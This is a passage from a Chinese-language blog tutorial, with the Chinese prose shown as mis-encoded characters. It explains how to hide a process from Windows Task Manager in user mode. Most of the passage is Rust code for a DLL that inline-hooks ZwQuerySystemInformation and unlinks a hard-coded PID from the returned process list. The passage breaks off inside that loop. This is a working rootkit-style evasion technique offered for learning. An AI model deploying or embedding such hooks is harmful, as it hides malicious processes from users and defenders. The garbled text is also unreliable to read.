<p>è¿™ä¸ªéƒ¨åˆ†æˆ‘è§‰å¾—æ˜¯æœ‰ç”¨çš„ï¼Œè‡³å°‘èƒ½è®©ä¸€äº›è½¯ä»¶æ˜¾ç¤ºä¸å‡ºæ¥æˆ‘ä»¬çš„è¿›ç¨‹ã€‚</p></blockquote>
<p>R3æ¶ˆé™¤è¿›ç¨‹æˆ‘ä¸»è¦å­¦åˆ°ä¸¤ä¸ªæ–¹é¢ï¼Œä¸€ä¸ªæ˜¯hookï¼Œä¸€ä¸ªæ˜¯R3æ–­é“¾</p>
<h4 id="api-hook-hookä»»åŠ¡ç®¡ç†å™¨">[API hook] Hookä»»åŠ¡ç®¡ç†å™¨</h4>
<p>è¿™é‡Œä¸»è¦é’ˆå¯¹ä»»åŠ¡ç®¡ç†å™¨è¿›ç¨‹ï¼Œè®©ä»»åŠ¡ç®¡ç†å™¨è·å–ä¸åˆ°æˆ‘ä»¬çš„è¿›ç¨‹ã€‚è¿™é‡Œå…¶å®æ˜¯hookæ‰ä»»åŠ¡ç®¡ç†å™¨çš„<code>ZwQuerySystemInformation</code>å‡½æ•°ï¼Œè¿™ç¯‡<a href="https://bbs.kanxue.com/thread-269919.htm">çœ‹é›ªçš„æ–‡ç« </a>å·²ç»å®ç°è¿‡äº†c/c++ç‰ˆæœ¬çš„ï¼Œæˆ‘è¿™é‡Œå°±ç”¨rustçš„å†™ä¸€éR3çš„éƒ¨åˆ†ã€‚</p>
<blockquote>
<p>çœ‹é›ªæ–‡ç« æ˜¯æ‰‹åŠ¨å®ç°hookçš„è¿‡ç¨‹ï¼Œæˆ‘æ˜¯ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„hookåº“ï¼Œå› ä¸ºä»»åŠ¡ç®¡ç†è¿˜æ¶‰åŠåˆ°ä¸€äº›å¤šçº¿ç¨‹çš„é—®é¢˜ï¼Œç®€å•æ‰‹åŠ¨hookå¯èƒ½ä¼šæœ‰é—®é¢˜ã€‚ç”¨ç¬¬ä¸‰æ–¹åº“åˆ™å·²ç»å¸®æˆ‘è§£å†³è¿™ä¸ªé—®é¢˜äº†ã€‚</p></blockquote>
<p>ä»»åŠ¡ç®¡ç†å™¨è·å–è¿›ç¨‹ä¿¡æ¯ï¼Œåº•å±‚è°ƒç”¨çš„æ˜¯<code>ZwQuerySystemInformation</code>å‡½æ•°</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>NTSTATUS WINAPI <span style="color:#008b45">ZwQuerySystemInformation</span>(
</span></span><span style="display:flex;"><span>  __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
</span></span><span style="display:flex;"><span>  __inout    PVOID SystemInformation,
</span></span><span style="display:flex;"><span>  __in       ULONG SystemInformationLength,
</span></span><span style="display:flex;"><span>  __out_opt  PULONG ReturnLength);
</span></span></code></pre></div><table>
  <thead>
      <tr>
          <th>å‚æ•°</th>
          <th>è¯´æ˜</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>SystemInformationClass</td>
          <td>è¦æ£€ç´¢çš„ç±»å‹ã€‚æ˜¯ä¸€ä¸ªSYSTEM_INFORMATION_CLASSçš„è”åˆä½“</td>
      </tr>
      <tr>
          <td>SystemInformation</td>
          <td>æŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œç”¨äºæ¥æ”¶è¯·æ±‚ä¿¡æ¯ã€‚è¯¥ä¿¡æ¯çš„å¤§å°å’Œç»“æ„å–å†³äºSystemInformationClass</td>
      </tr>
      <tr>
          <td>SystemInformationLength</td>
          <td>SystemInformationå‚æ•°æŒ‡å‘çš„ç¼“å†²åŒºçš„å¤§å°</td>
      </tr>
      <tr>
          <td>ReturnLength</td>
          <td>ä¸€ä¸ªå¯é€‰æŒ‡é’ˆï¼ŒæŒ‡å‘å‡½æ•°å†™å…¥è¯·æ±‚ä¿¡æ¯çš„å®é™…å¤§å°çš„ä½ç½®</td>
      </tr>
  </tbody>
</table>
<p>SystemInformationClassä¸­æœ‰å¾ˆå¤šç±»å‹</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">typedef</span> <span style="color:#8b008b;font-weight:bold">enum</span> _SYSTEM_INFORMATION_CLASS {
</span></span><span style="display:flex;"><span>    SystemBasicInformation = <span style="color:#b452cd">0</span>,
</span></span><span style="display:flex;"><span>    SystemPerformanceInformation = <span style="color:#b452cd">2</span>,
</span></span><span style="display:flex;"><span>    SystemTimeOfDayInformation = <span style="color:#b452cd">3</span>,
</span></span><span style="display:flex;"><span>    SystemProcessInformation = <span style="color:#b452cd">5</span>,
</span></span><span style="display:flex;"><span>    SystemProcessorPerformanceInformation = <span style="color:#b452cd">8</span>,
</span></span><span style="display:flex;"><span>    SystemInterruptInformation = <span style="color:#b452cd">23</span>,
</span></span><span style="display:flex;"><span>    SystemExceptionInformation = <span style="color:#b452cd">33</span>,
</span></span><span style="display:flex;"><span>    SystemRegistryQuotaInformation = <span style="color:#b452cd">37</span>,
</span></span><span style="display:flex;"><span>    SystemLookasideInformation = <span style="color:#b452cd">45</span>
</span></span><span style="display:flex;"><span>} SYSTEM_INFORMATION_CLASS;
</span></span></code></pre></div><p><code>SystemProcessInformation(5)</code>å°±æ˜¯è¿›ç¨‹ä¿¡æ¯ç±»å‹ï¼Œæˆ‘ä»¬hookå‡½æ•°åï¼Œç›®æ ‡å°±æ˜¯<code>SystemInformationClass</code>çš„å€¼ç­‰äº5çš„æƒ…å†µã€‚</p>
<p>ç„¶åè¿˜éœ€è¦æ³¨æ„åˆ°SystemInformationå€¼ï¼Œè¿™ä¸ªå€¼çš„ç»“æ„ä½“å¦‚ä¸‹</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">struct</span> <span style="color:#008b45;font-weight:bold">SYSTEM_PROCESS_INFORMATION</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>NextEntryOffset: <span style="color:#00688b;font-weight:bold">u32</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>NumberOfThreads: <span style="color:#00688b;font-weight:bold">u32</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>Reserved1: [<span style="color:#00688b;font-weight:bold">u8</span>;<span style="color:#bbb"> </span><span style="color:#b452cd">48</span>],<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>ImageName: <span style="color:#008b45;font-weight:bold">super</span>::<span style="color:#8b008b;font-weight:bold">super</span>::Foundation::<span style="color:#00688b">UNICODE_STRING</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>BasePriority: <span style="color:#00688b;font-weight:bold">i32</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>UniqueProcessId: <span style="color:#008b45;font-weight:bold">super</span>::<span style="color:#8b008b;font-weight:bold">super</span>::Foundation::<span style="color:#00688b">HANDLE</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>Reserved2: *<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>core::ffi::c_void,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>HandleCount: <span style="color:#00688b;font-weight:bold">u32</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>SessionId: <span style="color:#00688b;font-weight:bold">u32</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>Reserved3: *<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>core::ffi::c_void,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>PeakVirtualSize: <span style="color:#00688b;font-weight:bold">usize</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>VirtualSize: <span style="color:#00688b;font-weight:bold">usize</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>Reserved4: <span style="color:#00688b;font-weight:bold">u32</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>PeakWorkingSetSize: <span style="color:#00688b;font-weight:bold">usize</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>WorkingSetSize: <span style="color:#00688b;font-weight:bold">usize</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>Reserved5: *<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>core::ffi::c_void,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>QuotaPagedPoolUsage: <span style="color:#00688b;font-weight:bold">usize</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>Reserved6: *<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>core::ffi::c_void,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>QuotaNonPagedPoolUsage: <span style="color:#00688b;font-weight:bold">usize</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>PagefileUsage: <span style="color:#00688b;font-weight:bold">usize</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>PeakPagefileUsage: <span style="color:#00688b;font-weight:bold">usize</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>PrivatePageCount: <span style="color:#00688b;font-weight:bold">usize</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">pub</span><span style="color:#bbb"> </span>Reserved7: [<span style="color:#00688b;font-weight:bold">i64</span>;<span style="color:#bbb"> </span><span style="color:#b452cd">6</span>],<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span>}<span style="color:#bbb">
</span></span></span></code></pre></div><p>å…¶ä¸­<code>UniqueProcessId</code>è¡¨ç¤ºè¿›ç¨‹pidï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å¯¹æ¯”æ˜¯å¦æ˜¯ç›®æ ‡è¿›ç¨‹çš„å€¼ã€‚ç„¶å<code>NextEntryOffset</code>è¡¨ç¤ºä¸‹ä¸€ä¸ªSYSTEM_PROCESS_INFORMATIONè·ç¦»å½“å‰è¿™ä¸ªç»“æ„ä½“çš„åç§»å€¼</p>
<p><img src="https://s2.loli.net/2024/05/31/QdgwEjzDxVNGXBZ.png" alt=""></p>
<p>æˆ‘è¿™é‡Œä½¿ç”¨<code>retour</code>åº“æ¥hookï¼Œæºç ä¸­æŒ‡å®šéœ€è¦hookçš„è¿›ç¨‹å·(ä»»åŠ¡ç®¡ç†å™¨çš„è¿›ç¨‹å·)åšå…¨å±€å˜é‡</p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#228b22">// éœ€è¦éšè—çš„è¿›ç¨‹id
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span><span style="color:#8b008b;font-weight:bold">const</span><span style="color:#bbb"> </span><span style="color:#00688b">HIDE_PID</span>: <span style="color:#00688b;font-weight:bold">i32</span> =<span style="color:#bbb"> </span><span style="color:#b452cd">21664</span>;<span style="color:#bbb">
</span></span></span></code></pre></div><p>ç„¶åå†™æˆä¸€ä¸ªdllçš„ä»£ç ï¼ŒåŸç†å°±æ˜¯inline hookï¼Œå†™æ³•å¯ä»¥å‚è€ƒæˆ‘ä¹‹å‰çš„<a href="https://military-axe.github.io/posts/rustbian-xie-ji-chong-hookde-fang-shi/">æ–‡ç« </a></p>
<div class="highlight"><pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span>static_detour!<span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">static</span><span style="color:#bbb"> </span>ZwQuerySystemInformationHook: <span style="color:#008b45;font-weight:bold">unsafe</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">extern</span><span style="color:#bbb"> </span><span style="color:#cd5555">&#34;system&#34;</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">fn</span>(<span style="color:#00688b">SYSTEM_INFORMATION_CLASS</span>,<span style="color:#bbb"> </span>*<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>c_void,<span style="color:#bbb"> </span>c_ulong,<span style="color:#bbb"> </span>*<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>c_ulong)<span style="color:#bbb"> </span>-&gt; <span style="color:#008b45;font-weight:bold">NTSTATUS</span>;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span><span style="color:#228b22">// A type alias for `ZwQuerySystemInformation` (makes the transmute easy on the eyes)
</span></span></span><span style="display:flex;"><span><span style="color:#228b22"></span><span style="color:#8b008b;font-weight:bold">type</span> <span style="color:#008b45;font-weight:bold">FnZwQuerySystemInformation</span><span style="color:#bbb"> </span>=<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">extern</span><span style="color:#bbb"> </span><span style="color:#cd5555">&#34;system&#34;</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">fn</span>(<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#00688b">SYSTEM_INFORMATION_CLASS</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>*<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>c_void,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>c_ulong,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>*<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>c_ulong,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span>)<span style="color:#bbb"> </span>-&gt; <span style="color:#008b45;font-weight:bold">NTSTATUS</span>;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span><span style="color:#cd5555">/// Called when the DLL is attached to the process.
</span></span></span><span style="display:flex;"><span><span style="color:#cd5555"></span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">fn</span> <span style="color:#008b45">main</span>()<span style="color:#bbb"> </span>-&gt; <span style="color:#658b00">Result</span>&lt;(),<span style="color:#bbb"> </span><span style="color:#658b00">Box</span>&lt;<span style="color:#8b008b;font-weight:bold">dyn</span><span style="color:#bbb"> </span>Error&gt;&gt;<span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span>address<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span>get_module_symbol_address(<span style="color:#cd5555">&#34;ntdll.dll&#34;</span>,<span style="color:#bbb"> </span><span style="color:#cd5555">&#34;ZwQuerySystemInformation&#34;</span>)<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>.expect(<span style="color:#cd5555">&#34;could not find &#39;ZwQuerySystemInformation&#39; address&#34;</span>);<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span>target: <span style="color:#008b45;font-weight:bold">FnZwQuerySystemInformation</span><span style="color:#bbb"> </span>=<span style="color:#bbb"> </span>mem::transmute(address);<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>ZwQuerySystemInformationHook<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>.initialize(target,<span style="color:#bbb"> </span>zwquery_system_infomation_detour)?<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>.enable()?;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#658b00">Ok</span>(())<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span><span style="color:#1e889b">#[allow(unused_assignments)]</span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span><span style="color:#cd5555">/// Called whenever `ZwQuerySystemInformation` is invoked in the process.
</span></span></span><span style="display:flex;"><span><span style="color:#cd5555"></span><span style="color:#8b008b;font-weight:bold">fn</span> <span style="color:#008b45">zwquery_system_infomation_detour</span>(<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>system_infomation_class: <span style="color:#008b45;font-weight:bold">SYSTEM_INFORMATION_CLASS</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>system_infomation: *<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>c_void,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>system_infomation_length: <span style="color:#008b45;font-weight:bold">c_ulong</span>,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>return_length: *<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>c_ulong,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb"></span>)<span style="color:#bbb"> </span>-&gt; <span style="color:#008b45;font-weight:bold">NTSTATUS</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>prev<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span><span style="color:#b452cd">0</span>;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span>status<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>ZwQuerySystemInformationHook.call(<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>system_infomation_class,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>system_infomation,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>system_infomation_length,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>return_length,<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>)<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>};<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">if</span><span style="color:#bbb"> </span>status<span style="color:#bbb"> </span>!=<span style="color:#bbb"> </span><span style="color:#00688b">STATUS_SUCCESS</span><span style="color:#bbb"> </span>||<span style="color:#bbb"> </span>system_infomation_class<span style="color:#bbb"> </span>!=<span style="color:#bbb"> </span>SystemProcessInformation<span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#8b008b;font-weight:bold">return</span><span style="color:#bbb"> </span>status;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>psystem_information: *<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span><span style="color:#00688b">SYSTEM_PROCESS_INFORMATION</span><span style="color:#bbb"> </span>=<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>mem::transmute(system_infomation)<span style="color:#bbb"> </span>};<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">    </span><span style="color:#8b008b;font-weight:bold">loop</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span><span style="color:#8b008b;font-weight:bold">if</span><span style="color:#bbb"> </span><span style="color:#00688b">HIDE_PID</span><span style="color:#bbb"> </span>==<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>(*psystem_information).UniqueProcessId.<span style="color:#b452cd">0</span><span style="color:#bbb"> </span>}<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span><span style="color:#00688b;font-weight:bold">i32</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span><span style="color:#8b008b;font-weight:bold">let</span><span style="color:#bbb"> </span>st<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>format!(<span style="color:#cd5555">&#34;system information ==&gt; </span><span style="color:#cd5555">{:#?}</span><span style="color:#cd5555">&#34;</span>,<span style="color:#bbb"> </span>*psystem_information)<span style="color:#bbb"> </span>};<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>MessageBoxA(<span style="color:#658b00">None</span>,<span style="color:#bbb"> </span><span style="color:#00688b">PCSTR</span>::from_raw(st.as_ptr()),<span style="color:#bbb"> </span>s!(<span style="color:#cd5555">&#34;info&#34;</span>),<span style="color:#bbb"> </span><span style="color:#00688b">MB_OK</span>)<span style="color:#bbb"> </span>};<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span><span style="color:#8b008b;font-weight:bold">if</span><span style="color:#bbb"> </span>prev<span style="color:#bbb"> </span>==<span style="color:#bbb"> </span><span style="color:#b452cd">0</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span>system_infomation<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span>(psystem_information<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span><span style="color:#00688b;font-weight:bold">u64</span><span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                    </span>+<span style="color:#bbb"> </span>(<span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>*psystem_information<span style="color:#bbb"> </span>}).NextEntryOffset<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span><span style="color:#00688b;font-weight:bold">u64</span>)<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                    </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span>*<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span>c_void;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>}<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">else</span><span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">if</span><span style="color:#bbb"> </span>(<span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>*psystem_information<span style="color:#bbb"> </span>}).NextEntryOffset<span style="color:#bbb"> </span>==<span style="color:#bbb"> </span><span style="color:#b452cd">0</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span>(<span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb"> </span>*(prev<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span>*<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span><span style="color:#00688b">SYSTEM_PROCESS_INFORMATION</span>)<span style="color:#bbb"> </span>}).NextEntryOffset<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span><span style="color:#b452cd">0</span>;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>}<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">else</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span><span style="color:#8b008b;font-weight:bold">unsafe</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                    </span>(*(prev<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span>*<span style="color:#8b008b;font-weight:bold">mut</span><span style="color:#bbb"> </span><span style="color:#00688b">SYSTEM_PROCESS_INFORMATION</span>)).NextEntryOffset<span style="color:#bbb"> </span>+=<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                        </span>(*psystem_information).NextEntryOffset;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">                </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span><span style="color:#8b008b;font-weight:bold">break</span>;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>}<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">else</span><span style="color:#bbb"> </span>{<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">            </span>prev<span style="color:#bbb"> </span>=<span style="color:#bbb"> </span>psystem_information<span style="color:#bbb"> </span><span style="color:#8b008b;font-weight:bold">as</span><span style="color:#bbb"> </span><span style="color:#00688b;font-weight:bold">u64</span>;<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">        </span>}<span style="color:#bbb">
</span></span></span><span style="display:flex;"><span><span style="color:#bbb">
